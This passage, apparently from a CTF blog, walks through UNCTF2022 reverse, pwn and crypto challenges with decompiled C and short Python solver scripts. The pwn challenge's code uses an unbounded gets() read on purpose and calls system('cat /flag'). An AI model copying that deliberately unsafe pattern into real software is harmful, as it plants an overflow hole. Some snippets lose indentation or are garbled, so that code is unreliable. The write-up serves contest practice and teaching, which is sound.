class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+4h] [ebp-44h]</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+8h] [ebp-40h]</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [esp+Ch] [ebp-3Ch]</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// [esp+10h] [ebp-38h]</span><br>  <span class="hljs-type">int</span> v8; <span class="hljs-comment">// [esp+14h] [ebp-34h]</span><br>  <span class="hljs-type">int</span> v9; <span class="hljs-comment">// [esp+18h] [ebp-30h]</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// [esp+1Ch] [ebp-2Ch]</span><br>  <span class="hljs-type">int</span> v11; <span class="hljs-comment">// [esp+20h] [ebp-28h]</span><br>  <span class="hljs-type">int</span> v12; <span class="hljs-comment">// [esp+24h] [ebp-24h]</span><br>  <span class="hljs-type">int</span> v13; <span class="hljs-comment">// [esp+28h] [ebp-20h]</span><br>  <span class="hljs-type">int</span> v14; <span class="hljs-comment">// [esp+2Ch] [ebp-1Ch]</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">10</span>]; <span class="hljs-comment">// [esp+32h] [ebp-16h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v16; <span class="hljs-comment">// [esp+3Ch] [ebp-Ch]</span><br><br>  v16 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  v5 = <span class="hljs-string">&#x27;v&#x27;</span>;<br>  v6 = <span class="hljs-string">&#x27;g&#x27;</span>;<br>  v7 = <span class="hljs-string">&#x27;p&#x27;</span>;<br>  v8 = <span class="hljs-string">&#x27;k&#x27;</span>;<br>  v9 = <span class="hljs-string">&#x27;c&#x27;</span>;<br>  v10 = <span class="hljs-string">&#x27;m&#x27;</span>;<br>  v11 = <span class="hljs-string">&#x27;h&#x27;</span>;<br>  v12 = <span class="hljs-string">&#x27;n&#x27;</span>;<br>  v13 = <span class="hljs-string">&#x27;c&#x27;</span>;<br>  v14 = <span class="hljs-string">&#x27;i&#x27;</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;please input your key:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(s) == <span class="hljs-number">10</span> )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">9</span>; ++i )<br>    &#123;<br>      *(&amp;v5 + i) = ooooo(*(&amp;v5 + i));<br>      <span class="hljs-keyword">if</span> ( *(&amp;v5 + i) != s[i] )<br>      &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;no!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>      &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;this is flag flag&#123;%s&#125;&quot;</span>, s);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;no!!!!!!!!!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ooooo函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">signed</span> <span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">ooooo</span><span class="hljs-params">(<span class="hljs-type">signed</span> <span class="hljs-type">int</span> a1)</span><br>&#123;<br>  <span class="hljs-keyword">if</span> ( a1 == <span class="hljs-string">&#x27;m&#x27;</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;m&#x27;</span>;<br>  <span class="hljs-keyword">if</span> ( a1 &lt;= <span class="hljs-string">&#x27;o&#x27;</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( a1 &lt;= <span class="hljs-string">&#x27;n&#x27;</span> )<br>      a1 -= <span class="hljs-number">2</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    a1 += <span class="hljs-number">3</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> a1;<br>&#125;<br></code></pre></td></tr></table></figure><p>就是一个字符替换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">flag= <span class="hljs-string">&#x27;vgpkcmhnci&#x27;</span><br>result=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:<br>  <span class="hljs-keyword">if</span> i==<span class="hljs-string">&#x27;m&#x27;</span>:<br>    result+=<span class="hljs-string">&#x27;m&#x27;</span><br>  <span class="hljs-keyword">if</span> i&lt;=<span class="hljs-string">&#x27;o&#x27;</span>:<br>    <span class="hljs-keyword">if</span> i&lt;=<span class="hljs-string">&#x27;n&#x27;</span>:<br>      result+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i)-<span class="hljs-number">2</span>)<br>  <span class="hljs-keyword">else</span>:<br>    result+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i)+<span class="hljs-number">3</span>)<br><br><br><span class="hljs-built_in">print</span>(result)<br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744910.png" alt="image-20221117223917552"></p><h2 id="ezzzzre-广东海洋大学"><a href="#ezzzzre-广东海洋大学" class="headerlink" title="ezzzzre-广东海洋大学"></a>ezzzzre-广东海洋大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744911.png" alt="image-20221119103002699"></p><p>直接ida打开，有加壳，用exeinfo查一下</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744912.png" alt="image-20221117225510765"></p><p>UPX的壳，拖一下</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744913.png" alt="image-20221117225939287"></p><p>main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> Str[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+2Ch] [rbp-4h]</span><br><br>  _main();<br>  v5 = <span class="hljs-number">72</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;pleace input your key:&quot;</span>);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, Str);<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(Str) == <span class="hljs-number">8</span> )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">7</span>; ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( Str[i] != KESSYAcG)<br>      &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;no no no !!!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>      &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;flag&#123;%s&#125;&quot;</span>, Str);<br>    result = <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The key is 8 bits&quot;</span>);<br>    result = <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个比上题还简单</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">code=<span class="hljs-string">&quot;HELLOCTF&quot;</span><br>flag=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> code:<br>flag+=<span class="hljs-built_in">chr</span>(<span class="hljs-number">2</span> * <span class="hljs-built_in">ord</span>(i) - <span class="hljs-number">69</span>)<br><span class="hljs-built_in">print</span>(flag) <br></code></pre></td></tr></table></figure><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="welcomeUNCTF2022-云南警官学院"><a href="#welcomeUNCTF2022-云南警官学院" class="headerlink" title="welcomeUNCTF2022-云南警官学院"></a>welcomeUNCTF2022-云南警官学院</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744914.png" alt="image-20221119103016610"></p><p>差不多就是test your nc（我也只会这个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">func</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> s2[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+Ch] [ebp-1Ch]</span><br>  <span class="hljs-type">char</span> s; <span class="hljs-comment">// [esp+17h] [ebp-11h]</span><br><br>  <span class="hljs-built_in">strcpy</span>(s2, <span class="hljs-string">&quot;UNCTF&amp;2022&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to UNCTF2022 Please enter the password:&quot;</span>);<br>  gets(&amp;s);<br>  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(&amp;s, s2) )<br>    result = system(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    result = <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;wrong!!!&quot;</span>);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>输入UNCTF&amp;2022即可得到flag</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="md5-1-西南科技大学"><a href="#md5-1-西南科技大学" class="headerlink" title="md5-1-西南科技大学"></a>md5-1-西南科技大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744915.png" alt="image-20221119104458140"></p><p>加密源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br><br>flag=<span class="hljs-string">&#x27;UNCTF&#123;%s&#125;&#x27;</span>%md5(<span class="hljs-string">&#x27;x&#x27;</span>.encode()).hexdigest()<br><span class="hljs-comment"># x不是一个字符是n个字符</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<span class="hljs-keyword">as</span> file:<br>        file.write(md5(i.encode()).hexdigest()+<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>直接用可见字符的md5逐个比对，爆破出来flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br>result=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<span class="hljs-keyword">as</span> f:<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f.readlines():<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>re=md5(<span class="hljs-built_in">chr</span>(i).encode()).hexdigest()<br><span class="hljs-keyword">if</span> line.strip() == re :<br>result+=<span class="hljs-built_in">chr</span>(i)<br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-keyword">break</span><br>f.close()<br><span class="hljs-built_in">print</span>(result)<br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744916.png" alt="image-20221117201435030"></p><h2 id="dddd-西南科技大学"><a href="#dddd-西南科技大学" class="headerlink" title="dddd-西南科技大学"></a>dddd-西南科技大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744917.png" alt="image-20221119104521470"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">110</span>/<span class="hljs-number">01</span>/<span class="hljs-number">0101</span>/<span class="hljs-number">0</span>/<span class="hljs-number">1101</span>/<span class="hljs-number">0000100</span>/<span class="hljs-number">0100</span>/<span class="hljs-number">11110</span>/<span class="hljs-number">111</span>/<span class="hljs-number">110010</span>/<span class="hljs-number">0</span>/<span class="hljs-number">1111</span>/<span class="hljs-number">10000</span>/<span class="hljs-number">111</span>/<span class="hljs-number">110010</span>/<span class="hljs-number">1000</span>/<span class="hljs-number">110</span>/<span class="hljs-number">111</span>/<span class="hljs-number">0</span>/<span class="hljs-number">110010</span>/<span class="hljs-number">00</span>/<span class="hljs-number">00000</span>/<span class="hljs-number">101</span>/<span class="hljs-number">111</span>/<span class="hljs-number">1</span>/<span class="hljs-number">0000010</span><br></code></pre></td></tr></table></figure><p>转摩斯</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">..-<span class="hljs-regexp">/-./</span>-.-.<span class="hljs-regexp">/-/</span>..-.<span class="hljs-regexp">/----.--/</span>-.--<span class="hljs-regexp">/....-/</span>...<span class="hljs-regexp">/..--.-/</span>-<span class="hljs-regexp">/..../</span>.----<span class="hljs-regexp">/.../</span>..--.-<span class="hljs-regexp">/.---/</span>..-<span class="hljs-regexp">/.../</span>-<span class="hljs-regexp">/..--.-/</span>--<span class="hljs-regexp">/-----/</span>.-.<span class="hljs-regexp">/.../</span>./-----.-<br></code></pre></td></tr></table></figure><p>解密</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cos">UNCTF<span class="hljs-built_in">%u</span>7bY4S_TH1S_JUST_M0RSE<span class="hljs-built_in">%u</span>7d<br>UNCTF&#123;Y4S_TH1S_JUST_M0RSE&#125;<br></code></pre></td></tr></table></figure><h2 id="caesar-西南科技大学"><a href="#caesar-西南科技大学" class="headerlink" title="caesar-西南科技大学"></a>caesar-西南科技大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744918.png" alt="image-20221119104544669"></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">我把表换成了base64的表<br><br>B6vAy&#123;dhd_AOiZ_KiMyLYLU<span class="hljs-built_in">a_JlL</span>/HY&#125;<br></code></pre></td></tr></table></figure><p>换表了，奉上我写的垃圾脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">dic = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br><br>str1 = <span class="hljs-string">&quot;B6vAy&#123;dhd_AOiZ_KiMyLYLUa_JlL/HY&#125;&quot;</span><br>flag=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">25</span>):<br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> str1:<br>        <span class="hljs-keyword">if</span> s <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;&#125;&#123;_&quot;</span>:<br>            n = dic.find(s)<br>            s = dic[(n+key)%<span class="hljs-number">64</span>]<br>            flag+=s<br>        <span class="hljs-keyword">else</span>:<br>            flag+=s<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;UNCTF&quot;</span> <span class="hljs-keyword">in</span> flag:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;key=%d&quot;</span>%key, end=<span class="hljs-string">&#x27;\n&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(flag)<br>        <span class="hljs-keyword">break</span><br>    flag=<span class="hljs-string">&quot;&quot;</span><br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744919.png" alt="image-20221117202039265"></p><h2 id="Single-table-西南科技大学"><a href="#Single-table-西南科技大学" class="headerlink" title="Single table-西南科技大学"></a>Single table-西南科技大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744920.png" alt="image-20221119104558831"></p><p>找规律出的。。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">key</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;PLAY&quot;</span><br>OTUBM&#123;BCQ_SPH_WOQA_UAYFMKLWS&#125;<br></code></pre></td></tr></table></figure><p>给了一个例子：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">ABCDEFGHIKLMNOPQRSTUVWXYZ</span><br><span class="hljs-variable">key</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;ABCD&quot;</span><br><span class="hljs-variable">table</span><span class="hljs-operator">=</span><br><span class="hljs-punctuation">[</span><br>    <span class="hljs-built_in">E</span><span class="hljs-operator">,</span><span class="hljs-variable">F</span><span class="hljs-operator">,</span><span class="hljs-variable">G</span><span class="hljs-operator">,</span><span class="hljs-variable">H</span><span class="hljs-operator">,</span><span class="hljs-built_in">I</span><span class="hljs-operator">,</span><br>    <span class="hljs-built_in">K</span><span class="hljs-operator">,</span><span class="hljs-variable">L</span><span class="hljs-operator">,</span><span class="hljs-variable">M</span><span class="hljs-operator">,</span><span class="hljs-built_in">N</span><span class="hljs-operator">,</span><span class="hljs-built_in">O</span><span class="hljs-operator">,</span><br>    <span class="hljs-variable">P</span><span class="hljs-operator">,</span><span class="hljs-variable">Q</span><span class="hljs-operator">,</span><span class="hljs-variable">R</span><span class="hljs-operator">,</span><span class="hljs-variable">S</span><span class="hljs-operator">,</span><span class="hljs-variable">T</span><span class="hljs-operator">,</span><br>    <span class="hljs-variable">U</span><span class="hljs-operator">,</span><span class="hljs-variable">V</span><span class="hljs-operator">,</span><span class="hljs-variable">W</span><span class="hljs-operator">,</span><span class="hljs-variable">X</span><span class="hljs-operator">,</span><span class="hljs-variable">Y</span><span class="hljs-operator">,</span><br>    <span class="hljs-variable">Z</span><span class="hljs-operator">,</span><span class="hljs-variable">A</span><span class="hljs-operator">,</span><span class="hljs-variable">B</span><span class="hljs-operator">,</span><span class="hljs-built_in">C</span><span class="hljs-operator">,</span><span class="hljs-built_in">D</span><br><span class="hljs-punctuation">]</span><br>明文<span class="hljs-operator">=</span><span class="hljs-type">THE_CODE</span><br>整理为：<span class="hljs-variable">TH</span> <span class="hljs-variable">EC</span> <span class="hljs-variable">OD</span> <span class="hljs-variable">EX</span><br>密文为：<span class="hljs-variable">IS</span> <span class="hljs-variable">ZH</span> <span class="hljs-variable">TI</span> <span class="hljs-variable">UH</span><br>整理为：<span class="hljs-type">ISZ_HTIU</span><br><br>密文：<span class="hljs-type">ISZ_HTIUH</span><br>整理为：<span class="hljs-variable">IS</span> <span class="hljs-variable">ZH</span> <span class="hljs-variable">TI</span> <span class="hljs-variable">UH</span><br>明文为：<span class="hljs-variable">TH</span> <span class="hljs-variable">EC</span> <span class="hljs-variable">DO</span> <span class="hljs-variable">EX</span><br>整理为：<span class="hljs-type">THE_CODE</span><br></code></pre></td></tr></table></figure><p>可以找到规律，交叉的字符就选对位（按顺序），左右并排的就往左顺移一位，上下并列的就往上顺移一位</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">OTUBM</span><span class="hljs-punctuation">&#123;</span><span class="hljs-type">BCQ_SPH</span><span class="hljs-type">_WOQA</span><span class="hljs-type">_UAYFMKLWS</span><span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-variable">table</span><span class="hljs-operator">=</span><br><span class="hljs-punctuation">[</span><br><span class="hljs-variable">B</span><span class="hljs-operator">,</span><span class="hljs-built_in">C</span><span class="hljs-operator">,</span><span class="hljs-built_in">D</span><span class="hljs-operator">,</span><span class="hljs-built_in">E</span><span class="hljs-operator">,</span><span class="hljs-variable">F</span><span class="hljs-operator">,</span><br><span class="hljs-variable">G</span><span class="hljs-operator">,</span><span class="hljs-variable">H</span><span class="hljs-operator">,</span><span class="hljs-built_in">I</span><span class="hljs-operator">,</span><span class="hljs-built_in">K</span><span class="hljs-operator">,</span><span class="hljs-variable">M</span><span class="hljs-operator">,</span><br><span class="hljs-built_in">N</span><span class="hljs-operator">,</span><span class="hljs-built_in">O</span><span class="hljs-operator">,</span><span class="hljs-variable">Q</span><span class="hljs-operator">,</span><span class="hljs-variable">R</span><span class="hljs-operator">,</span><span class="hljs-variable">S</span><span class="hljs-operator">,</span><br><span class="hljs-variable">T</span><span class="hljs-operator">,</span><span class="hljs-variable">U</span><span class="hljs-operator">,</span><span class="hljs-variable">V</span><span class="hljs-operator">,</span><span class="hljs-variable">W</span><span class="hljs-operator">,</span><span class="hljs-variable">X</span><span class="hljs-operator">,</span><br><span class="hljs-variable">Z</span><span class="hljs-operator">,</span><span class="hljs-variable">P</span><span class="hljs-operator">,</span><span class="hljs-variable">L</span><span class="hljs-operator">,</span><span class="hljs-variable">A</span><span class="hljs-operator">,</span><span class="hljs-variable">Y</span><br><span class="hljs-punctuation">]</span><br><br><span class="hljs-variable">OT</span>  <span class="hljs-variable">UB</span>  <span class="hljs-variable">MB</span>  <span class="hljs-variable">CQ</span>  <span class="hljs-variable">SP</span>  <span class="hljs-variable">HW</span>  <span class="hljs-variable">OQ</span>  <span class="hljs-variable">AU</span>  <span class="hljs-variable">AY</span>  <span class="hljs-variable">FM</span>  <span class="hljs-variable">KL</span>  <span class="hljs-variable">WS</span> <br><br><span class="hljs-variable">UN</span> <span class="hljs-variable">CT</span>  <span class="hljs-variable">FG</span>  <span class="hljs-variable">OD</span>  <span class="hljs-variable">YO</span>  <span class="hljs-variable">UK</span>  <span class="hljs-variable">NO</span>  <span class="hljs-variable">WP</span>  <span class="hljs-variable">LA</span>  <span class="hljs-variable">YF</span>  <span class="hljs-variable">AI</span>  <span class="hljs-variable">RE</span><br><br><span class="hljs-variable">UNCTF</span><span class="hljs-punctuation">&#123;</span><span class="hljs-type">GOD_YOU</span><span class="hljs-type">_KNOW</span><span class="hljs-type">_PLAYFAIR</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>后面去掉一个E是我试出来的。</p><h2 id="ezRSA-广东海洋大学"><a href="#ezRSA-广东海洋大学" class="headerlink" title="ezRSA-广东海洋大学"></a>ezRSA-广东海洋大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744921.png" alt="image-20221119104635126"></p><p>很久没看RSA了</p><p>ezRSA.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><br>p=libnum.generate_prime(<span class="hljs-number">256</span>)<br>e=<span class="hljs-number">65537</span><br>m=flag<br><br>m=libnum.s2n(m)<br>n=p**<span class="hljs-number">4</span><br>phi_n=p**<span class="hljs-number">4</span>-p**<span class="hljs-number">3</span><span class="hljs-comment">#p=89065756791595323358603857939783936930073695697065732353414009005162022399741</span><br>d=libnum.invmod(e,phi_n)<br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;n=&quot;</span>,n)<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;e=&quot;</span>,e)<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;c=&quot;</span>,c)<br><span class="hljs-number">62927872600012424</span> <span class="hljs-number">750752897921698090776534304875632744929068546073325488283530025400224435562694273281157865037525456502678901681910303434689364320018805568710613581859910858077737519009451023667409223317546843268613019139524821964086036781112269486089069810631981766346242114671167202613483097500263981460561</span><br><span class="hljs-number">65537</span> <br><span class="hljs-number">56959646997081238078544634686875547709710666590620774134883288258992627876759606112717080946141796037573409168410595417635905762691247827322319628226051756406843950023290877673732151483843276348210800329658896558968868729658727981445607937645264850938932045242425625625685274204668013600475330284378427177504</span><br></code></pre></td></tr></table></figure><p>phi_n给了，并且n能分解所以能直接秒</p><figure 